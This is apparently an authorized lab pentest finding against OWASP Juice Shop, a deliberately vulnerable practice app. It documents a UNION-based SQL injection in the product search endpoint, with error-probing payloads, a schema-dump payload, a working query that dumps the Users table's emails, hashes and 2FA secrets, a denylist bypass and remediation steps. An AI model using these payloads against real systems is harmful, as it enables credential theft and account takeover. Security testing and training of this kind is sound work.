# c05-sqli-union-dump — UNION-based SQLi, full Users table exfiltrated

**Target:** OWASP Juice Shop @ `http://host.docker.internal:3000` (authorized own lab)
**Vulnerability:** SQL injection (UNION-based, unauthenticated), CWE-89
**Endpoint:** `GET /rest/products/search?q=<INJECT>`
**Backend:** SQLite via Sequelize/knex
**Result:** full `Users` table dumped (24 rows) — emails, roles, MD5 password hashes

---

## 1. Root cause

The search term `q` is string-concatenated into the SQL query:

```sql
SELECT * FROM Products
WHERE ((name LIKE '%<q>%' OR description LIKE '%<q>%')
       AND deletedAt IS NULL)
ORDER BY name
```

Anything sent in `q` becomes SQL. Because the injection point sits inside
`LIKE '%...%'` wrapped in two parentheses, the payload closes with `'))`.

## 2. Confirmation / column count (error oracle)

The app returns raw stack-trace style error pages, which leak the SQL error:

| payload `q=` | response |
|---|---|
| `qwerty' UNION SELECT ...` | `SQLITE_ERROR: near "UNION": syntax error` (unbalanced quote/parens) |
| `qwerty')) UNION SELECT 1..8 --` | `SELECTs to the left and right of UNION do not have the same number of result columns` |
| `qwerty')) UNION SELECT 1..9 --` | same error |
| **`qwerty')) UNION SELECT 1..10 --`** | **HTTP 200, echoed `1..10` in the product JSON → 10 columns** |
| `qwerty')) UNION SELECT 1..11 --` | column-count error |

`SELECT * FROM Products` really has 10 columns
(`id,name,description,price,deluxePrice,image,alternateImages,createdAt,updatedAt,deletedAt`).

Bonus finding: verbatim DB error disclosure (information leak).

## 3. Schema reconstruction

```http
GET /rest/products/search?q=qwerty')) UNION SELECT 1,name,4,5,6,7,8,9,10,sql FROM sqlite_master--
```

Dumped every `CREATE TABLE` from `sqlite_master`, giving the exact `Users`
schema:

```sql
CREATE TABLE `Users` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `username` VARCHAR(255) DEFAULT '',
  `email` VARCHAR(255) UNIQUE,
  `password` VARCHAR(255),
  `role` VARCHAR(255) DEFAULT 'customer',
  `deluxeToken` VARCHAR(255) DEFAULT '',
  `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0',
  `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg',
  `totpSecret` VARCHAR(255) DEFAULT '',
  `isActive` TINYINT(1) DEFAULT 1,
  `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL,
  `deletedAt` DATETIME
)
```

## 4. Working exploitation payload

```http
GET /rest/products/search?q=qwerty'))+UNION+SELECT+id,username,email,password,role,deluxeToken,7,profileImage,totpSecret,isActive+FROM+Users--
```

Column mapping (Products → Users): `id→id`, `name→username`,
`description→email`, `price→password`, `deluxePrice→role`,
`image→deluxeToken`, `alternateImages→literal 7`, `createdAt→profileImage`,
`updatedAt→totpSecret`, `deletedAt→isActive`.

### Filter quirk encountered
A naive blocklist in front of the route (returns `Error: Unexpected path: ...`)
rejects these literals inside `q`:

* `tbl_name`  → worked around with `name` in `sqlite_master`
* `lastLoginIp` → worked around by substituting the literal `7` in that slot

This is a denylist, not a fix — the injection is fully exploitable.

## 5. Impact

* Unauthenticated read of **every** credential in the database.
* Passwords are unsalted **MD5** → trivially crackable/rainbow-tabled.
  Verified: `admin@juice-sh.op` = `0192023a7bbd73250516f069df18b500` = **`admin123`**.
* Leaks `totpSecret` (2FA seeds), `deluxeToken` (auth material for deluxe
  endpoints) and `role` → direct path to account takeover / privilege escalation.

## 6. Evidence

| file | contents |
|---|---|
| `evidence/c5_users.txt` | **deliverable** — first 10 rows, `email<TAB>role<TAB>hash` |
| `evidence/c5_users_full.json` | all 24 rows, full field set |
| `evidence/c5_poc_run.log` | console output of the reproduction |
| `pocs/c5_union_sqli.py` | primary PoC (probe → schema → dump → write evidence) |
| `pocs/c5_union_sqli.sh` | raw-curl reproduction of all three steps |

## 7. Remediation

1. Use parameterised queries / ORM bindings — never concatenate `q`.
2. Return generic error messages; log SQL errors server-side only.
3. Salt + slow-hash passwords (bcrypt/argon2), migrate the MD5 hashes.
4. Remove the keyword denylist — it provides no security and hides the real bug.
